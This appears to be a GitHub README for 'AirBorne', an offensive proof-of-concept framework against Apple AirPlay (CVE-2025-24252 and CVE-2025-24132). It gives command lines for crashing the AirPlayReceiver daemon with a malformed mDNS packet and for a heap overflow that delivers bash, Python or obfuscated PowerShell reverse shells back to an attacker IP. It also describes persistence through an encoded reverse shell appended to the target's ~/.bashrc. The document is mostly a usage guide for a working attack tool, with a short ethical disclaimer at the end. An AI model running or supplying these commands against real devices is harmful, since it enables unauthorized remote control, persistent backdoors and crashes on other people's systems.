# AirBorne PoC Framework – Elite RCE Edition

> **Full PoC Framework for CVE-2025-24252 & CVE-2025-24132**  
> By [ekomsSavior](https://github.com/ekomsSavior) | 

AirBorne is a combined proof-of-concept (PoC) framework targeting two serious vulnerabilities in Apple's AirPlay service. It includes a full crash trigger and a working reverse shell exploit with optional persistence, listener, and multiple payload formats — all in one script.

>  **Looking for the original version?**  
> The legacy edition is still available in the `legacy` branch of this repository.  
> To check it out:

```bash
git checkout legacy
```

---

## CVEs Covered

###  CVE-2025-24252 – mDNS TXT Record Crash
- Triggers a crash in the AirPlayReceiver daemon via a malformed mDNS packet
- Works over UDP broadcast on port 5353

###  CVE-2025-24132 – Heap Overflow → Reverse Shell (RCE)
- Triggers a heap overflow in AirPlay's TCP service on port 7000
- Supports bash, python, and PowerShell reverse shell payloads
- Includes optional persistence using `.bashrc` injection (Linux)

---

## Getting Started

### 1. Clone the Repo

```bash
git clone https://github.com/ekomsSavior/AirBorne-PoC.git
cd AirBorne-PoC
```

### 2. Install Dependencies

```bash
sudo apt update
sudo apt install -y python3-scapy netcat
```

---

## Runtime Walkthrough

The single script `airborne.py` includes both PoCs and all logic:

* Select a CVE using `--exploit`
* Set a reverse shell payload using `--payload`
* Auto-starts a netcat listener for you
* Optionally enables persistence on target using `--persistent`

---

## Usage Examples

### Crash Target with mDNS Packet (CVE-2025-24252)

```bash
sudo python3 airborne.py --exploit 24252 --interface wlan0
```

> Requires an interface in monitor mode.

---

### Launch Heap Overflow → RCE (CVE-2025-24132)

Start full exploit with default bash shell:

```bash
sudo python3 airborne.py --exploit 24132 --target 192.168.1.42 --attacker 192.168.1.99
```

Choose Python shell instead:

```bash
sudo python3 airborne.py --exploit 24132 --target 192.168.1.42 --attacker 192.168.1.99 --payload python
```

Enable real persistence on Linux targets:

```bash
sudo python3 airborne.py --exploit 24132 --target 192.168.1.42 --attacker 192.168.1.99 --persistent
```

Only shell command einjection

```bash
sudo python3 airborne_bash_command_injector.py --exploit 24132 --target 192.168.1.42 --command "command"
```

---

## Payload Options

| Payload      | Description                                         |
| ------------ | --------------------------------------------------- |
| `bash`       | Default bash reverse shell over TCP                 |
| `python`     | Python-based reverse shell using `socket` and `pty` |
| `powershell` | Full Windows PowerShell RCE payload (obfuscated)    |

---

## Persistence Mode

When using `--persistent`, the script will append the encoded reverse shell payload to the target’s:

```bash
~/.bashrc
```

This ensures a shell is returned to you each time the user logs in or a terminal is spawned.

---

## Maintenance Notes

* Reverse shells are encoded using `base64` and delivered after buffer overflow
* All payloads are sent via port 7000
* mDNS packets go over UDP 5353 and require raw socket permission
* Make sure your attack box IP is reachable by the target device
* Script handles basic error cases and fails silently if closed ports

---

## Ethical Disclaimer

**This project is intended for educational, ethical, and authorized research only.**

* You must have explicit permission to test the target system.
* You assume full responsibility for any actions taken.

Unauthorized exploitation of systems is illegal and unethical.

---

## Credits

* Built by [ekomsSavior](https://github.com/ekomsSavior) 
* Inspired by real-world CVEs and exploit development research


